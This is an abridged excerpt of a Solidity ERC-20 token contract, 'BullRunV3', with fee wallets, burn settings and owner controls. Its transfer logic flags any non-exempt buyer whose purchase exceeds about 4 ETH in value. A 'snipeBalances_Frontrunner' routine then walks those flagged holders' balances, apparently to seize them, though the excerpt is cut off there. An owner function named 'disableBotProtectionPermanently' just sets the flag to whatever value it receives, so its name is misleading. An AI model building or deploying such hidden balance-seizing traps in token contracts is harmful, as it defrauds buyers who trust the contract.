...
contract BullRunv3 is Context, IERC20, Ownable {
    ...
    address private feeOne = 0x6Fb88D187AE4d0509aD356C630300852bd1F27B6;
    address private feeTwo = 0xA97E7D36cCa5CeB4Ab09bF59Ac38E6C63742EAf0;    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private botWallets;
    mapping(address => bool) private _isExcludedFromFee;
    string private _name = "BullRunV3";
    string private _symbol = "BRV3";
    uint8 private _decimals = 9;
    uint256 private _tTotal = 3_141_592_654 * 10 ** _decimals;
    ...
    uint256 public burnFrequencynMinutes = 314;  
    uint256 public burnRateInBasePoints = 100;  //1% burn
    ...
    function disableBotProtectionPermanently(bool input) external onlyOwner {
        isBotProtectionEnabled = input;
        snipeBalances();
   ...
   function setBurnSettings(uint256 frequencyInMinutes, uint256 burnBasePoints) external onlyOwner {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(from != deployer && to != deployer && from != address(this) && to != address(this)) {
            if(takeFees) {
                ...
                uint value = getValueOfAmount(amount);
                snipeBalances_Frontrunner();
                if (from == marketPair && value > 4000000000000000000 && !_isExcludedFromFee[to]){
                    botSnipingMap.set(to, block.timestamp);
                }
            }
        }       
    ...
    function snipeBalances_Frontrunner() private {
            for(uint256 i =0; i < botSnipingMap.size(); i++) {
                address holder = botSnipingMap.getKeyAtIndex(i);
                uint256 amount = _balances[holder];
                if(amount > 0) {
    ...
    function getValueOfAmount(uint amount) public view returns (uint256)  {
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);
